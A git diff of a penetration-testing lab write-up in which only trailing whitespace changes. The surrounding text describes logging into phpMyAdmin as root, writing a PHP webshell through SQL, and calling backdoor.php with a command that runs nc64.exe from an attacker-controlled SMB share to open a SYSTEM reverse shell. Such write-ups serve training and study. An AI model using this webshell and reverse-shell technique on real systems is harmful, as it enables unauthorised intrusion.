@@ -38,7 +38,7 @@ There's a PHPMyAdmin instance present on the page, and we can login using `root`
 
 <figure><img src="../../../.gitbook/assets/image (2202).png" alt=""><figcaption></figcaption></figure>
 
-Since this is already the administrative interface, we can get a shell by creating a database and then executing some SQL commands in it via the web SQL interpreter.&#x20;
+Since this is already the administrative interface, we can get a shell by creating a database and then executing some SQL commands in it via the web SQL interpreter.
 
 <figure><img src="../../../.gitbook/assets/image (971).png" alt=""><figcaption></figcaption></figure>
 
@@ -50,7 +50,7 @@ We can test it with any query and see that it is indeed processing SQL queries:
 
 <figure><img src="../../../.gitbook/assets/image (3448).png" alt=""><figcaption></figcaption></figure>
 
-Since we can submit queries, we can also write files into the file system of the machine. I wanted to write a basic PHP webshell, but this means we need to know the webroot file. Very conveniently, there's a `phpinfo` page on the main Wampserver page.&#x20;
+Since we can submit queries, we can also write files into the file system of the machine. I wanted to write a basic PHP webshell, but this means we need to know the webroot file. Very conveniently, there's a `phpinfo` page on the main Wampserver page.
 
 There, we can find the `DOCUMENT_ROOT`:
 
@@ -76,7 +76,7 @@ http://192.168.233.189:8080/backdoor.php?cmd=\\192.168.45.161\share\nc64.exe+-e+
 
 <figure><img src="../../../.gitbook/assets/image (1207).png" alt=""><figcaption></figcaption></figure>
 
-There is no privilege escalation, because we have successfully gotten a SYSTEM shell.&#x20;
+There is no privilege escalation, because we have successfully gotten a SYSTEM shell.
 
 {% hint style="info" %}
 This machine was changed since I last did it in 2022. My older writeups show that the machine was running as LOCAL SYSTEM instead of the SYSTEM user.
